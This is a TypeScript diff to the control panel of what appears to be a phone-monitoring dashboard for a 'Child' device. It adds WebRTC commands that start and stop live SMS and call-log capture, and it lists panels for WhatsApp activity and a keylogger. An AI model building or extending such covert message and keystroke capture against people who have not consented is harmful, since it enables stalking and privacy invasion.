@@ -5,13 +5,34 @@
  * Hey friend! This coordinates the right-hand inspection & control panel:
  *  - Handles drag resizing of the left edge (width between 300px and 600px).
  *  - Renders the header with panel title, refresh action, and close button.
- *  - Mounts the active feature panel from its dedicated modular file in the sibling structure.
- *  - Strictly conforms to the pure Black & White design tokens.
+ *  - Mounts active feature panels (SMS, Call Log, Notifications, Apps) from dedicated sibling modules.
+ *  - Wires bottom footer Play/Pause monitoring button with loading spinners (loading.svg)
+ *    and real-time DataChannel telemetry coordination.
+ *  - Strictly conforms to the pure Black & White design tokens with zero emojis.
  */
 
 import { rightSidebarState } from './state.js';
 import { sidebarState } from '../left-sidebar/state.js';
-import type { RightSidebarPanelId, PanelConfig } from './types.js';
+import {
+  type RightSidebarPanelId,
+  type PanelConfig,
+  CMD_CALLLOG_ON,
+  CMD_CALLLOG_OFF,
+  RESP_CALLLOG_STARTED,
+  RESP_CALLLOG_STOPPED,
+  RESP_CALLLOG_ERROR_PREFIX,
+  TYPE_CALLLOG_HISTORY,
+  TYPE_CALLLOG_NEW,
+  CMD_SMS_ON,
+  CMD_SMS_OFF,
+  RESP_SMS_STARTED,
+  RESP_SMS_STOPPED,
+  RESP_SMS_ERROR_PREFIX,
+  TYPE_SMS_HISTORY,
+  TYPE_SMS_NEW
+} from './types.js';
+import { webrtcManager } from '../webrtc/webrtc-manager.js';
+import { triggerSidebarToast } from './shared.js';
 import { renderSmsPanel } from './sms/sms.js';
 import { renderCallLogPanel } from './calllog/calllog.js';
 import { renderNotificationPanel } from './notification/notification.js';
@@ -31,9 +52,12 @@ import { renderAppLockPanel } from './applock/applock.js';
 import { renderVibrateFlashPanel } from './vibrateflash/vibrateflash.js';
 import { renderWallpaperPanel } from './wallpaper/wallpaper.js';
 
+let callLogTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
+let smsTimeoutTimer: ReturnType<typeof setTimeout> | null = null;
+
 const PANEL_CONFIGS: Record<RightSidebarPanelId, PanelConfig> = {
   sms: { title: 'SMS Messages', badge: 'Active Sync', render: renderSmsPanel },
-  calllog: { title: 'Call Log', badge: '5 Records', render: renderCallLogPanel },
+  calllog: { title: 'Call Log', badge: 'Live Stream', render: renderCallLogPanel },
   notification: { title: 'Notifications', badge: 'Live Stream', render: renderNotificationPanel },
   keyboard: { title: 'Keyboard Audit', badge: 'Keylogger', render: renderKeyboardPanel },
   whatsapp: { title: 'WhatsApp Activity', badge: 'Encrypted', render: renderWhatsAppPanel },
@@ -53,18 +77,177 @@ const PANEL_CONFIGS: Record<RightSidebarPanelId, PanelConfig> = {
 };
 
 /**
- * Initializes the Right Sidebar component, sets up resizing and listeners.
+ * Initializes the Right Sidebar component, sets up resizing, DataChannel message parsing, and listeners.
  */
 export function initRightSidebar(): void {
   setupResizeHandle();
+  setupDataChannelListeners();
 
-  // Re-render whenever active panel state changes
+  // Re-render whenever active panel or monitoring telemetry changes
   rightSidebarState.subscribe(() => {
     renderRightSidebar();
   });
 
   // Initial render
   renderRightSidebar();
+}
+
+/**
+ * Connects DataChannel message listening for Call Log and SMS payloads.
+ */
+function setupDataChannelListeners(): void {
+  webrtcManager.onMessage((rawMessage: string) => {
+    const trimmed = rawMessage.trim();
+
+    // -------------------------------------------------------------------------
+    // CALL LOG PROTOCOL RESPONSES
+    // -------------------------------------------------------------------------
+    if (trimmed === RESP_CALLLOG_STARTED) {
+      console.log('[RightSidebar] Child confirmed: CALLLOG_STARTED');
+      if (callLogTimeoutTimer) {
+        clearTimeout(callLogTimeoutTimer);
+        callLogTimeoutTimer = null;
+      }
+      rightSidebarState.setCallLogMonitoringState('LIVE');
+      sidebarState.setFeatureLive('calllog', true);
+      return;
+    }
+
+    if (trimmed === RESP_CALLLOG_STOPPED) {
+      console.log('[RightSidebar] Child confirmed: CALLLOG_STOPPED');
+      if (callLogTimeoutTimer) {
+        clearTimeout(callLogTimeoutTimer);
+        callLogTimeoutTimer = null;
+      }
+      rightSidebarState.setCallLogMonitoringState('IDLE');
+      sidebarState.setFeatureLive('calllog', false);
+      return;
+    }
+
+    if (trimmed.startsWith(RESP_CALLLOG_ERROR_PREFIX)) {
+      const err = trimmed.slice(RESP_CALLLOG_ERROR_PREFIX.length);
+      console.error('[RightSidebar] Call Log error from Child:', err);
+      if (callLogTimeoutTimer) {
+        clearTimeout(callLogTimeoutTimer);
+        callLogTimeoutTimer = null;
+      }
+      rightSidebarState.setCallLogMonitoringState('IDLE');
+      sidebarState.setFeatureLive('calllog', false);
+      triggerSidebarToast(err);
+      return;
+    }
+
+    // Call Log JSON Payloads
+    if (trimmed.startsWith(`{"type":"${TYPE_CALLLOG_HISTORY}"`)) {
+      try {
+        const payload = JSON.parse(trimmed);
+        console.log(`[RightSidebar] Received ${payload.count} historical call records.`);
+        rightSidebarState.setCallLogs(payload.records || []);
+      } catch (e) {
+        console.error('[RightSidebar] Failed to parse CALLLOG_HISTORY payload:', e);
+      }
+      return;
+    }
+
+    if (trimmed.startsWith(`{"type":"${TYPE_CALLLOG_NEW}"`)) {
+      try {
+        const payload = JSON.parse(trimmed);
+        console.log('[RightSidebar] Received new live call:', payload.record);
+        if (payload.record) {
+          rightSidebarState.prependCallRecord(payload.record);
+          triggerSidebarToast(`New Call: ${payload.record.name || payload.record.number} (${payload.record.callType})`);
+        }
+      } catch (e) {
+        console.error('[RightSidebar] Failed to parse CALLLOG_NEW payload:', e);
+      }
+      return;
+    }
+
+    // -------------------------------------------------------------------------
+    // SMS PROTOCOL RESPONSES
+    // -------------------------------------------------------------------------
+    if (trimmed === RESP_SMS_STARTED) {
+      console.log('[RightSidebar] Child confirmed: SMS_STARTED');
+      if (smsTimeoutTimer) {
+        clearTimeout(smsTimeoutTimer);
+        smsTimeoutTimer = null;
+      }
+      rightSidebarState.setSmsMonitoringState('LIVE');
+      sidebarState.setFeatureLive('sms', true);
+      return;
+    }
+
+    if (trimmed === RESP_SMS_STOPPED) {
+      console.log('[RightSidebar] Child confirmed: SMS_STOPPED');
+      if (smsTimeoutTimer) {
+        clearTimeout(smsTimeoutTimer);
+        smsTimeoutTimer = null;
+      }
+      rightSidebarState.setSmsMonitoringState('IDLE');
+      sidebarState.setFeatureLive('sms', false);
+      return;
+    }
+
+    if (trimmed.startsWith(RESP_SMS_ERROR_PREFIX)) {
+      const err = trimmed.slice(RESP_SMS_ERROR_PREFIX.length);
+      console.error('[RightSidebar] SMS error from Child:', err);
+      if (smsTimeoutTimer) {
+        clearTimeout(smsTimeoutTimer);
+        smsTimeoutTimer = null;
+      }
+      rightSidebarState.setSmsMonitoringState('IDLE');
+      sidebarState.setFeatureLive('sms', false);
+      triggerSidebarToast(err);
+      return;
+    }
+
+    // SMS JSON Payloads
+    if (trimmed.startsWith(`{"type":"${TYPE_SMS_HISTORY}"`)) {
+      try {
+        const payload = JSON.parse(trimmed);
+        console.log(`[RightSidebar] Received SMS chunk [${payload.chunkIndex + 1}/${payload.totalChunks}] count=${payload.count}`);
+        if (payload.chunkIndex === 0) {
+          rightSidebarState.clearSmsMessages();
+        }
+        rightSidebarState.appendSmsChunk(payload.messages || []);
+      } catch (e) {
+        console.error('[RightSidebar] Failed to parse SMS_HISTORY payload:', e);
+      }
+      return;
+    }
+
+    if (trimmed.startsWith(`{"type":"${TYPE_SMS_NEW}"`)) {
+      try {
+        const payload = JSON.parse(trimmed);
+        console.log('[RightSidebar] Received new live SMS:', payload.message);
+        if (payload.message) {
+          rightSidebarState.prependSmsRecord(payload.message);
+          triggerSidebarToast(`New SMS from ${payload.message.senderName || payload.message.address}`);
+        }
+      } catch (e) {
+        console.error('[RightSidebar] Failed to parse SMS_NEW payload:', e);
+      }
+      return;
+    }
+  });
+
+  // Reset monitoring state when WebRTC disconnects
+  webrtcManager.onConnectionStateChange((state) => {
+    if (state !== 'connected') {
+      console.log('[RightSidebar] Peer disconnected. Resetting monitoring states...');
+      if (callLogTimeoutTimer) {
+        clearTimeout(callLogTimeoutTimer);
+        callLogTimeoutTimer = null;
+      }
+      if (smsTimeoutTimer) {
+        clearTimeout(smsTimeoutTimer);
+        smsTimeoutTimer = null;
+      }
+      rightSidebarState.resetMonitoringStates();
+      sidebarState.setFeatureLive('calllog', false);
+      sidebarState.setFeatureLive('sms', false);
+    }
+  });
 }
 
 /**
@@ -142,35 +325,234 @@ export function renderRightSidebar(): void {
   const playIcon = sidebar.querySelector<HTMLImageElement>('#rs-play-icon');
   const statusSpan = sidebar.querySelector<HTMLElement>('#rs-footer-status');
 
-  const updatePlayState = (live: boolean) => {
-    if (live) {
-      playBtn?.classList.add('active');
-      playBtn?.setAttribute('title', 'Pause Monitoring');
-      if (playIcon) playIcon.src = 'assets/icons/main-content/pause.svg';
-      if (statusSpan) {
-        statusSpan.innerHTML = '<span class="status-live-dot"></span><span>Live Monitoring</span>';
-        statusSpan.classList.add('live');
-      }
-    } else {
-      playBtn?.classList.remove('active');
-      playBtn?.setAttribute('title', 'Start Monitoring');
-      if (playIcon) playIcon.src = 'assets/icons/main-content/play.svg';
-      if (statusSpan) {
-        statusSpan.textContent = 'Monitoring Paused';
-        statusSpan.classList.remove('live');
-      }
-    }
-  };
+  // Synchronize footer button for Call Log panel
+  if (activePanelId === 'calllog') {
+    const callState = rightSidebarState.getCallLogMonitoringState();
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, callState, 'Call Log');
 
-  // Initially in paused state until user plays
+    playBtn?.addEventListener('click', () => {
+      handleCallLogPlayPauseClick(playBtn, playIcon, statusSpan);
+    });
+    return;
+  }
+
+  // Synchronize footer button for SMS panel
+  if (activePanelId === 'sms') {
+    const smsState = rightSidebarState.getSmsMonitoringState();
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, smsState, 'SMS Messages');
+
+    playBtn?.addEventListener('click', () => {
+      handleSmsPlayPauseClick(playBtn, playIcon, statusSpan);
+    });
+    return;
+  }
+
+  // Generic fallback for other panels
   const isLive = sidebarState.isFeatureLive(activePanelId);
-  updatePlayState(isLive);
+  updateGenericPlayState(playBtn, playIcon, statusSpan, isLive);
 
   playBtn?.addEventListener('click', () => {
     const nextLive = !sidebarState.isFeatureLive(activePanelId);
     sidebarState.setFeatureLive(activePanelId, nextLive);
-    updatePlayState(nextLive);
+    updateGenericPlayState(playBtn, playIcon, statusSpan, nextLive);
   });
+}
+
+/**
+ * Handles Play/Pause click action specifically for Call Log monitoring.
+ */
+function handleCallLogPlayPauseClick(
+  playBtn: HTMLButtonElement | null,
+  playIcon: HTMLImageElement | null,
+  statusSpan: HTMLElement | null
+): void {
+  const currentState = rightSidebarState.getCallLogMonitoringState();
+
+  if (currentState === 'IDLE') {
+    console.log('[RightSidebar] Starting Call Log monitoring...');
+    rightSidebarState.setCallLogMonitoringState('STARTING');
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'Call Log');
+
+    const sent = webrtcManager.sendCommand(CMD_CALLLOG_ON);
+    if (!sent) {
+      console.warn('[RightSidebar] DataChannel not open. Reverting CallLog state to IDLE.');
+      rightSidebarState.setCallLogMonitoringState('IDLE');
+      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Call Log');
+      triggerSidebarToast('Cannot start: DataChannel not connected');
+      return;
+    }
+
+    // Safety timeout fallback (20s)
+    if (callLogTimeoutTimer) clearTimeout(callLogTimeoutTimer);
+    callLogTimeoutTimer = setTimeout(() => {
+      if (rightSidebarState.getCallLogMonitoringState() === 'STARTING') {
+        console.warn('[RightSidebar] Timeout waiting for CALLLOG_STARTED. Reverting to IDLE.');
+        rightSidebarState.setCallLogMonitoringState('IDLE');
+        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Call Log');
+        triggerSidebarToast('Call Log request timed out');
+      }
+    }, 20000);
+
+  } else if (currentState === 'LIVE') {
+    console.log('[RightSidebar] Stopping Call Log monitoring...');
+    rightSidebarState.setCallLogMonitoringState('STOPPING');
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'Call Log');
+
+    const sent = webrtcManager.sendCommand(CMD_CALLLOG_OFF);
+    if (!sent) {
+      rightSidebarState.setCallLogMonitoringState('IDLE');
+      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Call Log');
+      return;
+    }
+
+    if (callLogTimeoutTimer) clearTimeout(callLogTimeoutTimer);
+    callLogTimeoutTimer = setTimeout(() => {
+      if (rightSidebarState.getCallLogMonitoringState() === 'STOPPING') {
+        rightSidebarState.setCallLogMonitoringState('IDLE');
+        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'Call Log');
+      }
+    }, 20000);
+  }
+}
+
+/**
+ * Handles Play/Pause click action specifically for SMS monitoring.
+ */
+function handleSmsPlayPauseClick(
+  playBtn: HTMLButtonElement | null,
+  playIcon: HTMLImageElement | null,
+  statusSpan: HTMLElement | null
+): void {
+  const currentState = rightSidebarState.getSmsMonitoringState();
+
+  if (currentState === 'IDLE') {
+    console.log('[RightSidebar] Starting SMS monitoring...');
+    rightSidebarState.setSmsMonitoringState('STARTING');
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STARTING', 'SMS Messages');
+
+    const sent = webrtcManager.sendCommand(CMD_SMS_ON);
+    if (!sent) {
+      console.warn('[RightSidebar] DataChannel not open. Reverting SMS state to IDLE.');
+      rightSidebarState.setSmsMonitoringState('IDLE');
+      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'SMS Messages');
+      triggerSidebarToast('Cannot start: DataChannel not connected');
+      return;
+    }
+
+    // Safety timeout fallback (20s)
+    if (smsTimeoutTimer) clearTimeout(smsTimeoutTimer);
+    smsTimeoutTimer = setTimeout(() => {
+      if (rightSidebarState.getSmsMonitoringState() === 'STARTING') {
+        console.warn('[RightSidebar] Timeout waiting for SMS_STARTED. Reverting to IDLE.');
+        rightSidebarState.setSmsMonitoringState('IDLE');
+        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'SMS Messages');
+        triggerSidebarToast('SMS request timed out');
+      }
+    }, 20000);
+
+  } else if (currentState === 'LIVE') {
+    console.log('[RightSidebar] Stopping SMS monitoring...');
+    rightSidebarState.setSmsMonitoringState('STOPPING');
+    updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'STOPPING', 'SMS Messages');
+
+    const sent = webrtcManager.sendCommand(CMD_SMS_OFF);
+    if (!sent) {
+      rightSidebarState.setSmsMonitoringState('IDLE');
+      updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'SMS Messages');
+      return;
+    }
+
+    if (smsTimeoutTimer) clearTimeout(smsTimeoutTimer);
+    smsTimeoutTimer = setTimeout(() => {
+      if (rightSidebarState.getSmsMonitoringState() === 'STOPPING') {
+        rightSidebarState.setSmsMonitoringState('IDLE');
+        updateFooterMonitoringUi(playBtn, playIcon, statusSpan, 'IDLE', 'SMS Messages');
+      }
+    }, 20000);
+  }
+}
+
+/**
+ * Updates UI state of bottom dock play/pause button and status text.
+ */
+function updateFooterMonitoringUi(
+  btn: HTMLButtonElement | null,
+  icon: HTMLImageElement | null,
+  status: HTMLElement | null,
+  state: 'IDLE' | 'STARTING' | 'LIVE' | 'STOPPING',
+  featureLabel: string
+): void {
+  if (!btn || !icon || !status) return;
+
+  switch (state) {
+    case 'IDLE':
+      btn.classList.remove('active', 'is-loading');
+      btn.removeAttribute('disabled');
+      btn.setAttribute('title', `Start Monitoring ${featureLabel}`);
+      icon.src = 'assets/icons/main-content/play.svg';
+      status.textContent = 'Monitoring Paused';
+      status.classList.remove('live');
+      break;
+
+    case 'STARTING':
+      btn.classList.add('is-loading');
+      btn.classList.remove('active');
+      btn.setAttribute('disabled', 'true');
+      btn.setAttribute('title', `Requesting ${featureLabel} from Child device...`);
+      icon.src = 'assets/icons/animations/loading.svg';
+      status.textContent = `Connecting ${featureLabel}...`;
+      status.classList.remove('live');
+      break;
+
+    case 'LIVE':
+      btn.classList.add('active');
+      btn.classList.remove('is-loading');
+      btn.removeAttribute('disabled');
+      btn.setAttribute('title', `Pause Monitoring ${featureLabel}`);
+      icon.src = 'assets/icons/main-content/pause.svg';
+      status.innerHTML = '<span class="status-live-dot"></span><span>Live Monitoring</span>';
+      status.classList.add('live');
+      break;
+
+    case 'STOPPING':
+      btn.classList.add('is-loading');
+      btn.setAttribute('disabled', 'true');
+      btn.setAttribute('title', `Stopping ${featureLabel}...`);
+      icon.src = 'assets/icons/animations/loading.svg';
+      status.textContent = 'Stopping...';
+      status.classList.remove('live');
+      break;
+  }
+}
+
+/**
+ * Fallback handler for generic static preview panels.
+ */
+function updateGenericPlayState(
+  playBtn: HTMLButtonElement | null,
+  playIcon: HTMLImageElement | null,
+  statusSpan: HTMLElement | null,
+  live: boolean
+): void {
+  if (live) {
+    playBtn?.classList.add('active');
+    playBtn?.removeAttribute('disabled');
+    playBtn?.setAttribute('title', 'Pause Monitoring');
+    if (playIcon) playIcon.src = 'assets/icons/main-content/pause.svg';
+    if (statusSpan) {
+      statusSpan.innerHTML = '<span class="status-live-dot"></span><span>Live Monitoring</span>';
+      statusSpan.classList.add('live');
+    }
+  } else {
+    playBtn?.classList.remove('active');
+    playBtn?.removeAttribute('disabled');
+    playBtn?.setAttribute('title', 'Start Monitoring');
+    if (playIcon) playIcon.src = 'assets/icons/main-content/play.svg';
+    if (statusSpan) {
+      statusSpan.textContent = 'Monitoring Paused';
+      statusSpan.classList.remove('live');
+    }
+  }
 }
 
 /**
